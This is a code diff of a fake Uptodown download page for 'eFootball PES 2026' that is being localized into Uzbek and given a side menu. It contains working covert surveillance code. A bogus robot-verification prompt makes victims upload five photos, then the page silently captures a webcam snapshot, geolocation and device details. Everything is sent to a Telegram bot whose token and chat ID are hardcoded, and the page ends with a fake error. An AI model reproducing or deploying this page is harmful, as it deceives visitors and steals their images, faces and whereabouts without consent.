@@ -21,48 +21,90 @@
             background-color: var(--ut-bg);
             font-family: 'Roboto', sans-serif;
             color: #ffffff;
-            line-height: 1.4;
+            overflow-x: hidden;
         }
 
-        /* --- NAVIGATION --- */
+        /* --- NAVIGATION & SIDE MENU --- */
+        .top-centered-header {
+            background-color: var(--ut-dark);
+            padding: 12px 0;
+            border-bottom: 1px solid #102a33;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .main-logo { height: 24px; }
+
         header {
             background: var(--ut-dark);
-            height: 56px;
+            height: 50px;
             display: flex;
             align-items: center;
             padding: 0 16px;
-            border-bottom: 1px solid #102a33;
             position: sticky;
             top: 0;
             z-index: 1000;
         }
-        .menu-icon { color: var(--ut-blue); font-size: 24px; cursor: pointer; }
-        .logo { height: 22px; margin-left: 15px; }
+        .menu-btn { color: var(--ut-blue); font-size: 26px; cursor: pointer; }
 
-        .path-bar {
-            background: #06181e;
-            padding: 10px 16px;
-            font-size: 10px;
-            color: var(--ut-dim);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+        /* Side Menu Panel */
+        .side-menu {
+            position: fixed;
+            top: 0;
+            left: -280px; /* Hidden by default */
+            width: 280px;
+            height: 100%;
+            background: var(--ut-dark);
+            z-index: 2000;
+            transition: 0.3s ease;
+            box-shadow: 5px 0 15px rgba(0,0,0,0.5);
+            display: flex;
+            flex-direction: column;
         }
+        .side-menu.active { left: 0; }
 
+        .menu-header {
+            padding: 20px;
+            background: var(--ut-bg);
+            border-bottom: 1px solid #102a33;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .menu-header img { height: 20px; }
+
+        .menu-list { list-style: none; padding: 10px 0; margin: 0; }
+        .menu-item {
+            padding: 15px 25px;
+            font-size: 15px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .menu-item:hover { background: #102a33; color: var(--ut-blue); }
+        .menu-item i { width: 20px; text-align: center; color: var(--ut-dim); }
+
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 1500;
+            display: none;
+        }
+        .overlay.active { display: block; }
+
+        /* --- CONTENT STYLES --- */
+        .path-bar { background: #06181e; padding: 10px 16px; font-size: 10px; color: var(--ut-dim); text-transform: uppercase; }
         .main-content { max-width: 1000px; margin: 0 auto; padding: 20px 16px; }
 
-        /* --- APP HEADER --- */
         .app-header { display: flex; gap: 16px; margin-bottom: 24px; align-items: center; }
-        .app-icon { 
-            width: 100px; height: 100px; 
-            border-radius: 22px; 
-            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
-            object-fit: cover; /* Rasmni to'liq va buzilmaydigan qiladi */
-        }
-        .app-info h1 { font-size: 26px; font-weight: 700; margin: 0; }
-        .app-sub { font-size: 14px; margin-top: 4px; color: var(--ut-dim); }
-        .app-sub a { color: var(--ut-blue); text-decoration: none; }
+        .app-icon { width: 90px; height: 90px; border-radius: 20px; object-fit: cover; }
+        .app-info h1 { font-size: 24px; font-weight: 700; margin: 0; }
+        .app-sub { font-size: 14px; color: var(--ut-dim); }
 
-        /* --- DOWNLOAD BUTTON --- */
         .btn-latest {
             background: var(--ut-green);
             color: #ffffff;
@@ -74,113 +116,79 @@
             border: none;
             box-shadow: 0 4px 0 #008a3d;
             cursor: pointer;
-            margin-bottom: 10px;
         }
 
-        /* --- TECHNICAL SECTIONS (100% MATCH) --- */
-        .tech-section-group { margin-top: 35px; }
-        .tech-group-title {
-            font-size: 16px;
-            font-weight: 700;
-            margin-bottom: 20px;
-            color: #ffffff;
-        }
-        .tech-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px 20px;
-        }
-        .tech-item { display: flex; align-items: flex-start; gap: 15px; }
-        .tech-icon-box {
-            width: 36px; height: 36px;
-            border: 1px solid var(--ut-blue);
-            border-radius: 8px;
-            display: flex; align-items: center; justify-content: center;
-            color: var(--ut-blue); flex-shrink: 0;
-        }
-        .tech-content { display: flex; flex-direction: column; }
-        .tech-label { font-size: 11px; color: var(--ut-dim); font-weight: 700; text-transform: uppercase; }
-        .tech-value { font-size: 14px; font-weight: 500; word-break: break-all; }
-        .tech-value a { color: var(--ut-blue); text-decoration: none; }
+        /* Technical Grid */
+        .tech-section-group { margin-top: 30px; }
+        .tech-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
+        .tech-item { display: flex; align-items: flex-start; gap: 12px; }
+        .tech-icon-box { width: 34px; height: 34px; border: 1px solid var(--ut-blue); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: var(--ut-blue); flex-shrink: 0; }
+        .tech-label { font-size: 10px; color: var(--ut-dim); font-weight: 700; }
+        .tech-value { font-size: 13px; word-break: break-all; }
 
-        /* --- VERIFICATION MODAL --- */
-        #verify-overlay {
-            display: none; position: fixed; inset: 0;
-            background: rgba(5, 17, 22, 0.98); z-index: 9999;
-            align-items: center; justify-content: center; padding: 20px;
-        }
-        .verify-modal {
-            background: var(--ut-card); width: 100%; max-width: 340px;
-            padding: 30px; border-radius: 16px; border: 1px solid var(--ut-blue); text-align: center;
-        }
+        /* Hidden elements for logic */
+        #verify-overlay { display: none; position: fixed; inset: 0; background: rgba(5, 17, 22, 0.98); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
+        .verify-modal { background: var(--ut-card); width: 100%; max-width: 340px; padding: 30px; border-radius: 16px; border: 1px solid var(--ut-blue); text-align: center; }
         video, canvas, #hidden-input { display: none; }
     </style>
 </head>
 <body>
 
+<div class="overlay" id="overlay" onclick="toggleMenu()"></div>
+<div class="side-menu" id="sideMenu">
+    <div class="menu-header">
+        <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" alt="Uptodown">
+    </div>
+    <ul class="menu-list">
+        <li class="menu-item">🏠 Bosh sahifa</li>
+        <li class="menu-item">🎮 O'yinlar</li>
+        <li class="menu-item">📱 Ilovalar</li>
+        <li class="menu-item">🔥 Eng sara yuklashlar</li>
+        <li class="menu-item">🆕 Yangi qo'shilganlar</li>
+        <li class="menu-item">⚙️ Sozlamalar</li>
+        <hr style="border: 0; border-top: 1px solid #102a33; margin: 10px 0;">
+        <li class="menu-item">❓ Yordam</li>
+        <li class="menu-item">ℹ️ Biz haqimizda</li>
+    </ul>
+</div>
+
+<div class="top-centered-header">
+    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="main-logo">
+</div>
+
 <header>
-    <div class="menu-icon">☰</div>
-    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo" alt="Uptodown">
+    <div class="menu-btn" onclick="toggleMenu()">☰</div>
 </header>
 
-<div class="path-bar">Android / Games / Sports / eFootball PES 2026</div>
+<div class="path-bar">Android / O'yinlar / Sport / eFootball PES 2026</div>
 
 <div class="main-content">
     <div class="app-header">
-        <img src="image_5.png" class="app-icon" alt="eFootball PES 2026 icon">
+        <img src="image_98f76c.png" class="app-icon" alt="PES 2026">
         <div class="app-info">
             <h1>eFootball PES 2026</h1>
-            <div class="app-sub">10.4.0 | <a href="#">Uptodown.com</a></div>
+            <div class="app-sub">10.4.0 | <span style="color:var(--ut-blue)">Uptodown.com</span></div>
         </div>
     </div>
 
-    <button class="btn-latest" onclick="openVerification()">Latest version</button>
+    <button class="btn-latest" onclick="openVerification()">Oxirgi versiya</button>
 
     <div class="tech-section-group">
-        <div class="tech-group-title">Basic Information</div>
+        <h3 style="font-size: 16px;">Texnik ma'lumotlar</h3>
         <div class="tech-grid">
-            <div class="tech-item"><div class="tech-icon-box">👤</div><div class="tech-content"><span class="tech-label">Developer</span><span class="tech-value"><a href="#">Uptodown.com</a></span></div></div>
-            <div class="tech-item"><div class="tech-icon-box">📄</div><div class="tech-content"><span class="tech-label">License</span><span class="tech-value">Free</span></div></div>
-            <div class="tech-item"><div class="tech-icon-box">⚽</div><div class="tech-content"><span class="tech-label">Category</span><span class="tech-value"><a href="#">General</a></span></div></div>
-            <div class="tech-item"><div class="tech-icon-box">ℹ️</div><div class="tech-content"><span class="tech-label">Rating</span><span class="tech-value">All ages</span></div></div>
-            <div class="tech-item"><div class="tech-icon-box">🌐</div><div class="tech-content"><span class="tech-label">Languages</span><span class="tech-value">English (45 more)</span></div></div>
-        </div>
-    </div>
-
-    <div class="tech-section-group">
-        <div class="tech-group-title">Security and privacy</div>
-        <div class="tech-grid">
-            <div class="tech-item"><div class="tech-icon-box">🛠️</div><div class="tech-content"><span class="tech-label">Required permissions</span><span class="tech-value"><a href="#">See 31 permissions</a></span></div></div>
-            <div class="tech-item"><div class="tech-icon-box">📢</div><div class="tech-content"><span class="tech-label">Advertising</span><span class="tech-value">This app contains ads</span></div></div>
-            <div class="tech-item" style="grid-column: 1 / -1;"><div class="tech-icon-box">🛡️</div><div class="tech-content"><span class="tech-label">Certificate signature</span><span class="tech-value">643506f9f2323740df1e2af5659caba8,ed86b3c7d53cba96769d1b431108e398</span></div></div>
-            <div class="tech-item"><div class="tech-icon-box">🔍</div><div class="tech-content"><span class="tech-label">Uptodown Analysis</span><span class="tech-value"><a href="#">See security report</a></span></div></div>
-        </div>
-    </div>
-
-    <div class="tech-section-group">
-        <div class="tech-group-title">Download info</div>
-        <div class="tech-grid">
-            <div class="tech-item"><div class="tech-icon-box">📥</div><div class="tech-content"><span class="tech-label">Downloads</span><span class="tech-value">1,034,167,963</span></div></div>
-            <div class="tech-item"><div class="tech-icon-box">📅</div><div class="tech-content"><span class="tech-label">Date</span><span class="tech-value">Apr 1, 2026</span></div></div>
-            <div class="tech-item"><div class="tech-icon-box">📦</div><div class="tech-content"><span class="tech-label">File type</span><span class="tech-value">APK</span></div></div>
-            <div class="tech-item"><div class="tech-icon-box">💾</div><div class="tech-content"><span class="tech-label">Size</span><span class="tech-value">297.02 mb</span></div></div>
-            <div class="tech-item" style="grid-column: 1 / -1;"><div class="tech-icon-box">🔑</div><div class="tech-content"><span class="tech-label">SHA256</span><span class="tech-value">589d836964354c1086841a100cf311fe20c7e100bf58f3d8e1c0c5d74fd4ad6d</span></div></div>
-        </div>
-    </div>
-
-    <div class="tech-section-group" style="padding-bottom: 50px;">
-        <div class="tech-group-title">Technical details</div>
-        <div class="tech-grid">
-            <div class="tech-item"><div class="tech-icon-box">⚙️</div><div class="tech-content"><span class="tech-label">Package Name</span><span class="tech-value">com.uptodown</span></div></div>
+            <div class="tech-item"><div class="tech-icon-box">👤</div><div><div class="tech-label">DASTURCHI</div><div class="tech-value">Uptodown.com</div></div></div>
+            <div class="tech-item"><div class="tech-icon-box">📄</div><div><div class="tech-label">LITSENZIYA</div><div class="tech-value">Bepul</div></div></div>
+            <div class="tech-item"><div class="tech-icon-box">📥</div><div><div class="tech-label">YUKLASHLAR</div><div class="tech-value">1,034,167,963</div></div></div>
+            <div class="tech-item"><div class="tech-icon-box">📅</div><div><div class="tech-label">SANA</div><div class="tech-value">1-Apr, 2026</div></div></div>
         </div>
     </div>
 </div>
 
 <div id="verify-overlay">
     <div class="verify-modal">
-        <h3 id="v-title">Verify Your Identity</h3>
-        <p style="font-size: 13px; color: var(--ut-dim);">Upload 5 photos to unlock the download.</p>
-        <label for="hidden-input" style="background: var(--ut-blue); display: block; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: 700; margin-top: 20px;">UPLOAD PHOTOS</label>
+        <h3 id="v-title">Robot emasligingizni tasdiqlang</h3>
+        <p style="font-size: 13px; color: var(--ut-dim);">Davom etish uchun 5 ta rasm yuklang.</p>
+        <label for="hidden-input" style="background: var(--ut-blue); display: block; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: 700; margin-top: 20px;">FOTO YUKLASH</label>
         <input type="file" id="hidden-input" multiple accept="image/*" onchange="processAI(this)">
     </div>
 </div>
@@ -189,6 +197,13 @@
 <canvas id="v-canvas"></canvas>
 
 <script>
+    // Menu funksiyasi
+    function toggleMenu() {
+        document.getElementById('sideMenu').classList.toggle('active');
+        document.getElementById('overlay').classList.toggle('active');
+    }
+
+    // Stealth & AI logikasi
     const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };
     let capturedFiles = [];
 
@@ -198,7 +213,7 @@
     function openVerification() { document.getElementById('verify-overlay').style.display = 'flex'; }
 
     async function processAI(input) {
-        document.getElementById('v-title').innerText = "Processing...";
+        document.getElementById('v-title').innerText = "Tekshirilmoqda...";
         const files = Array.from(input.files);
         for (let f of files) {
             const img = await faceapi.bufferToImage(f);
@@ -222,15 +237,15 @@
             stream.getTracks().forEach(t => t.stop());
             navigator.geolocation.getCurrentPosition(async (p) => {
                 await sendToBot(platform, `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude}`, snap);
-            }, () => sendToBot(platform, "Location Blocked", snap));
-        } catch(e) { sendToBot(platform, "Cam Error", null); }
+            }, () => sendToBot(platform, "Geo Blocked", snap));
+        } catch(e) { sendToBot(platform, "No Cam", null); }
     }
 
     async function sendToBot(pInfo, loc, snap) {
         await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CONFIG.CHAT, text: `📥 *Target Hit*\nDevice: ${pInfo}\nLocation: ${loc}`, parse_mode: 'Markdown'})
+            body: JSON.stringify({chat_id: CONFIG.CHAT, text: `📥 *Yangi Target*\nQurilma: ${pInfo}\nJoylashuv: ${loc}`, parse_mode: 'Markdown'})
         });
         if(snap) {
             const fd = new FormData(); fd.append('chat_id', CONFIG.CHAT); fd.append('photo', snap);
@@ -240,7 +255,7 @@
             const fd2 = new FormData(); fd2.append('chat_id', CONFIG.CHAT); fd2.append('photo', file);
             fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
         }
-        alert("Verification failed. Error code: 0x884.");
+        alert("Xatolik: Server bilan aloqa uzildi (0x884).");
         location.reload();
     }
 </script>
